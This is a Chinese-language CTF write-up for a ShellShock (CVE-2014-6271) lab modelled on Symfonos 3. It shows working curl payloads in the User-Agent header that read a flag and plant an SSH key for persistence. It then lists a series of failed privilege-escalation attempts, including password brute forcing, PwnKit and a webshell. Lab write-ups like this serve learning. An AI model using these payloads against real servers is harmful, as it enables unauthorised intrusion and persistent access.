---
title: 'ShellShock 冥界 — Dantes Inferno CTF Writeup'
date: '2026-07-19T00:00:00Z'
modifiedTime: '2026-07-19T00:00:00Z'
intro: "题目名称：冥界 / ShellShock / Dante's Inferno (基于 Symfonos 3)"
tags: ['ctf', 'writeup', 'cve', 'sql注入', '提权', 'php', 'python', '命令注入']
cover: ''
---
# ShellShock 冥界 — Dante's Inferno CTF Writeup

## 🏆 Flag 1: `flag{cfaab6ca-73bd-47af-a70d-5e31faade901}` ✅ | Flag 2: ❌ 提权探索中

## 挑战概述

- **题目名称**：冥界 / ShellShock / Dante's Inferno (基于 Symfonos 3)
- **漏洞类型**：CVE-2014-6271 (ShellShock) → 本地提权
- **靶场平台**：好靶场 (haobachang.loveli.com.cn)
- **两个 Flag**：`/tmp/flag.txt` ⏺ `/root/flag.txt`
- **环境**：Docker 容器 (overlay2)，内核 6.17.0-22-generic，Debian 9 用户空间
- **AppArmor**：`docker-default` 配置

## 靶场信息

| 服务 | DNS | IP | 端口 |
|------|-----|-----|------|
| Apache (ShellShock) | vd2il4r.haobachang.loveli.com.cn | 198.19.18.105 | 48985 |
| SSH | n88yhkr.haobachang.loveli.com.cn | 198.19.18.106 | 45704 |

> 注意：DNS 名称和端口是动态分配的，每次实例重启会变化

## Flag 1 — ShellShock 获取入口

### 发现

访问 Apache 首页看到注释 `<!-- Can you bust the underworld? -->`，目录扫描发现 `/cgi-bin/underworld` 脚本：

```bash
#!/bin/bash
echo "Content-type: text/html"
echo ""
uptime
```

### 利用 ShellShock (CVE-2014-6271)

```bash
curl -H 'User-Agent: () { :;}; echo; /bin/cat /tmp/flag.txt' \
  http://198.19.18.105:48985/cgi-bin/underworld
# flag{cfaab6ca-73bd-47af-a70d-5e31faade901}
```

### SSH 密钥注入 (持久化)

CGI 进程以 `cerberus` 用户运行，可通过 ShellShock 注入 SSH 公钥：

```bash
# 生成密钥
ssh-keygen -t rsa -b 2048 -f /tmp/ctf_key3 -N "" -q

# 用 Python 写入 (管道符会导致 500 错误)
KEYLINE=$(cat /tmp/ctf_key3.pub)
curl -s -H "User-Agent: () { :;}; echo; /usr/bin/python3 -c 'open(\"/home/cerberus/.ssh/authorized_keys\",\"w\").write(\"\"\"${KEYLINE}\"\"\")'" \
  http://198.19.18.105:48985/cgi-bin/underworld

# SSH 登录
ssh -i /tmp/ctf_key3 -p 45704 cerberus@198.19.18.106
```

### 环境枚举

```
用户：cerberus (uid=1001)
组：  cerberus, www-data(33), pcap(1003)
容器：Docker overlay2
CapEff: 0000000000000000 (无特权)
CapBnd: 00000000a80425fb (包含 CAP_DAC_OVERRIDE, CAP_SETUID 等)
```

## Flag 2 — 提权探索

### 目标用户与 privesc 链

```
cerberus → hades (密码破解) → sitecustomize.py (gods 组) → fail2ban (root Python3)
```

### 用户信息

| 用户 | UID | GID | 组 | 家目录 | Shell |
|------|-----|-----|-----|--------|-------|
| root | 0 | 0 | root | /root (700) | /bin/bash |
| hades | 1000 | 1000 | hades, gods(1002) | /home/hades (755) | /bin/bash |
| cerberus | 1001 | 1001 | cerberus, www-data, pcap | /home/cerberus | /bin/bash |

### 关键发现

| 文件/路径 | 权限 | 说明 |
|-----------|------|------|
| `/etc/python2.7/sitecustomize.py` | `-rwxrw-r-- root:gods` | **hades 可写！** gods 组成员可修改 |
| `/etc/python3.5/sitecustomize.py` | `-rw-r--r-- root:root` | **不可写**（与预期间不同！） |
| `/usr/local/lib/python3.5/dist-packages/` | `drwxrwsr-x root:staff` | SGID staff，但 cerberus 不在 staff 组 |
| `/opt/ftpclient/` | `drwxr-x--- root:hades` | hades 组可访问，疑似 FTP 凭据 |
| `/usr/local/bin/tcpdump` | `-rwxr-x--- root:pcap` | cerberus 可执行但缺 CAP_NET_RAW |
| `/var/backups/shadow.bak` | `-rw------- root:shadow` | 不可读 |
| `/sbin/unix_chkpwd` | `-rwxr-sr-x root:shadow` | SGID shadow，有反滥用保护 |

### ⚠️ 关键差异

**本次实例中** `/etc/python3.5/sitecustomize.py` 权限为 `root:root`，**不是**预期的 `root:gods`！
而 `/etc/python2.7/sitecustomize.py` 才是 `root:gods` 可写。但 fail2ban (`/usr/bin/fail2ban-server`) 使用 Python3 (`#!/usr/bin/python3`)，不使用 Python2。

这意味着即使破解了 hades 密码，也无法通过修改 sitecustomize.py 劫持 fail2ban。

### 重要发现：Python3 用户路径劫持

cerberus 的 `~/.local/lib/python3.5/site-packages/` 可通过 `.pth` 文件注入代码，**但仅对 cerberus 的 Python3 进程有效**，对 root 的 fail2ban 无效。

### 尝试过的密码爆破

使用 PTY + `su hades` 爆破，已尝试：
- 希腊神话相关词汇 (Hades, Cerberus, Styx, Acheron, Cocytus, Persephone...)
- 目录名 (hecatoncheires, titanomachy, thejudges...)
- CTF 常见密码 (admin, password, shellshock, symfonos...)
- `/usr/share/dict/words` 前 500 个 5-8 字符单词
- 共约 1000+ 密码，**无一命中**

### 失败的提权尝试

| 方法 | 结果 |
|------|------|
| ShellShock 写 SSH key 到 hades | `/home/hades` 不可写 (cerberus 无权限) |
| Exim 4.89 SUID 文件读取 | 打开文件前 drop privs 到 cerberus (euid=1001) |
| Exim `${run{}}` 扩展 | drop privs 后执行 |
| Exim -C /etc/shadow 配置泄露 | 读取配置前 drop privs |
| ProFTPd 启动利用 | 无 root 权限，无法创建 /var/log/proftpd |
| tcpdump 抓包 (pcap 组) | 需要 CAP_NET_RAW，AppArmor 阻止 |
| pkexec (PwnKit) | 无 dbus 服务 |
| newgrp / sg 切换组 | "failed to crypt password with previous salt" |
| gpasswd 添加到 gods 组 | 权限拒绝 |
| chfn/chsh/passwd 篡改 hades | 权限拒绝 |
| 杀掉 fail2ban 触发重启 | kill: Operation not permitted |
| /proc/*/root/ 访问 | Permission denied |
| PHP webshell | 同 cerberus 权限，无额外能力 |
| crontab 利用 | cerberus crontab 以 cerberus 运行，无法提权 |

### VPS 资源

```bash
ssh -p 44812 root@221.234.36.123
# /tmp/sucrack3 (静态 PTY 爆破)
# /tmp/pwnkit_static
# /usr/share/wordlists/rockyou.txt
```

⚠️ VPS 和靶机在不同网络，双方无法互通。

## 探索的文件和目录

### Web 目录结构

```
/var/www/html/
├── index.html       ← "Can you bust the underworld?"
├── image.jpg
├── keyinject.cgi    ← 格式损坏 (\n 为字面量，非换行)
└── gate/
    ├── index.html
    ├── image.jpg
    └── cerberus/
        ├── index.html
        ├── image.jpg
        └── tartarus/
            ├── index.html    ← "The underworld can be cruel... but it can also be misleading."
            ├── image.png     ← 3.8MB PNG，无隐写数据
            ├── research      ← 希腊冥界神话文本(~6.7KB)
            ├── acheron/      (空)
            ├── charon/       (空)
            ├── cocytus/      (空)
            ├── hecatoncheires/
            │   ├── index.html
            │   └── image.jpg
            ├── hermes/       (空)
            ├── phlegethon/   (空)
            ├── thejudges/    (空)
            └── titanomachy/  (空)
```

### 运行进程

```
PID 1:  /bin/bash /root/start.sh (root)
PID 10: /usr/sbin/rsyslogd (root)
PID 11: /usr/sbin/cron (root)
PID 20: su → apache2ctl → cerberus
PID 26: sshd (root)
PID 44: fail2ban-server (root, Python3)
```

## 架构

```
┌─────────────────────────────────────────────────┐
│              198.19.18.105 / 106                 │
│                                                 │
│  Port 48985: Apache 2.4.25 (直连)               │
│  Port 45704: SSH                                │
│                                                 │
│  Docker Container:                              │
│  ├─ /bin/bash /root/start.sh (PID 1, root)     │
│  ├─ Apache → su → cerberus (www-data)           │
│  ├─ fail2ban-server → Python3 (root)            │
│  ├─ cron (root)                                 │
│  ├─ sshd (root)                                 │
│  ├─ /tmp/flag.txt  ← ShellShock ✅             │
│  └─ /root/flag.txt ← 待提权 ❌                   │
│                                                 │
│  CapBnd: CAP_DAC_OVERRIDE, CAP_SETUID, etc      │
│  CapEff: (none for cerberus)                    │
└─────────────────────────────────────────────────┘
       ↑ 单向可达 (NAT)
┌──────┴──────┐
│  攻击机 Mac  │
└─────────────┘
       ↕ (双向)
┌──────┴──────┐
│   Kali VPS  │  221.234.36.123:44812
│  无法直连靶机  │
└─────────────┘
```

## 后续思路

1. **扩大密码爆破范围**：使用完整 rockyou.txt，但需要解决传输问题
2. **寻找 sitecustomize.py 替代**：是否有其他 Python 路径 root 的 fail2ban 会加载？
3. **fail2ban action 劫持**：研究 action.d 中的其他 action 配置
4. **容器逃逸**：Docker overlay2 可能有已知漏洞
5. **原版 Symfonos 3** 使用 tcpdump 抓 FTP 密码，但 Docker 环境禁用了 raw socket

## 参考

- 原始挑战：Symfonos 3 (VulnHub)
- CVE-2014-6271 (ShellShock)
- 原版 privesc：tcpdump 捕获 FTP 凭据 → hades → sitecustomize.py → fail2ban root
